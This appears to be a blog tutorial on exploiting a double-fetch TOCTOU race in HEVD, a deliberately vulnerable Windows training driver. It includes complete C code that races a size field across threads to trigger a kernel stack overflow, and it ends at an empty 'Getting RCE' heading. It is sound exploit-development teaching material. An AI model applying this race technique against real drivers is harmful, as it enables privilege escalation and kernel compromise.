---
title: Windows 10 x64 Kernel Exploitation - Time-of-Check Time-of-Use (TOCTOU) Race Condition using HEVD
---

## Looking at the Vulnerability

If we look at the `TriggerDoubleFetch` function within the HEVD driver with Binary Ninja, we can see its a stack buffer overflow like the first blog post, except this time with a check added to ensure the buffer passed from userland is <= 0x800. 

![Disassembly in pseudo C](/assets/img/2025-02-06/TOCTOU.png)

However, between the Time-of-check (TOC) and Time-of-use (TOU), the `UserDoubleFetch->Size` value could change, which makes the code vulnerbale to a TOCTOU race condition.

## Trigging the TOCTOU Race

I thought this would be difficult since the TOCTOU is only a couple assembly instructions, which would execute within a few nanoseconds. But it turns out its not too bad, you just need, at a minimal, two threads, one consistantly calling `DeviceIoControl` with a small buffer size that passes the check, and one thats switching the buffer size to a bigger value. The example below uses 5 threads doing each, but I got it working with `NUM_THREADS` set to `1`. 

Some people do fancy stuff like lock the threads to different CPU cores, or change process priority, but I didn't need this, and didn't want to since the code needs to run as a low privileged user and these APIs _should_ require privileges like `SeIncreaseBasePriorityPrivilege`.

```c
#include <Windows.h>

#include <stdio.h>
#include <string.h>

typedef signed char i8;
typedef short       i16;
typedef int         i32;
typedef long long   i64;

typedef unsigned char      u8;
typedef unsigned short     u16;
typedef unsigned int       u32;
typedef unsigned long long u64;

typedef struct _DOUBLE_FETCH {
    PVOID  Buffer;
    SIZE_T Size;
} DOUBLE_FETCH, *PDOUBLE_FETCH;

typedef struct _IRP_ARGS {
    HANDLE        hHEVD;
    DOUBLE_FETCH  pDoubleFetch;
} IRP_ARGS, *PIRP_ARGS;

#define ArraySize(x) (sizeof x / sizeof x[0])
#define IOCTL(Function) CTL_CODE (FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HEVD_IOCTL_DOUBLE_FETCH IOCTL(0x80D)

#define NUM_THREADS 5
#define BUFFER_SIZE 2500

DWORD WINAPI DeviceIoControlThread(LPVOID lpParameters) {

    PIRP_ARGS pIRPArgs = (PIRP_ARGS)lpParameters;

    while (1) {
        pIRPArgs->pDoubleFetch.Size = 0x10;

        DWORD dwBytesReturned = 0;
        DeviceIoControl(
            pIRPArgs->hHEVD,
            HEVD_IOCTL_DOUBLE_FETCH,
            &pIRPArgs->pDoubleFetch,
            sizeof(DOUBLE_FETCH),
            NULL,
            0x00,
            &dwBytesReturned,
            NULL);

        Sleep(1);
    }

    return 0;
}

DWORD WINAPI SizeChaingingThread(LPVOID lpParameters) {

    PIRP_ARGS pIRPArgs = (PIRP_ARGS)lpParameters;

    while (1) {
        pIRPArgs->pDoubleFetch.Size = BUFFER_SIZE;
        Sleep(1);
    }

    return 0;
}

int main(void) {

    HANDLE hHEVD = CreateFileA(
        "\\\\.\\HackSysExtremeVulnerableDriver",
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL);


    if (!hHEVD) ExitProcess(1);

    PVOID buffer = VirtualAlloc(NULL, BUFFER_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!buffer) ExitProcess(1);

    memset(buffer, 'A', BUFFER_SIZE);

    IRP_ARGS pIRPArgs = {
        .hHEVD = hHEVD,
        .pDoubleFetch.Buffer = buffer,
        .pDoubleFetch.Size = 0,
    };

    HANDLE hThreadWork[NUM_THREADS] = { 0 };
    HANDLE hThreadRace[NUM_THREADS] = { 0 };
    
    for (u64 i = 0; i < NUM_THREADS; i++) {
        hThreadWork[i] = CreateThread(NULL, 0, DeviceIoControlThread, &pIRPArgs, 0, NULL);
        hThreadRace[i] = CreateThread(NULL, 0, SizeChaingingThread,   &pIRPArgs, 0, NULL);
    }

    Sleep(30000);

    for (u64 i = 0; i < NUM_THREADS; i++) {
        if (hThreadWork[i] != NULL) {
            TerminateThread(hThreadWork[i], 0);
            CloseHandle(hThreadWork[i]);
        }
        if (hThreadRace[i] != NULL) {
            TerminateThread(hThreadRace[i], 0);
            CloseHandle(hThreadRace[i]);
        }
    }

    return 0;
}
```

![Disassembly in pseudo C](/assets/img/2025-02-06/overflow.PNG)

## Getting RCE

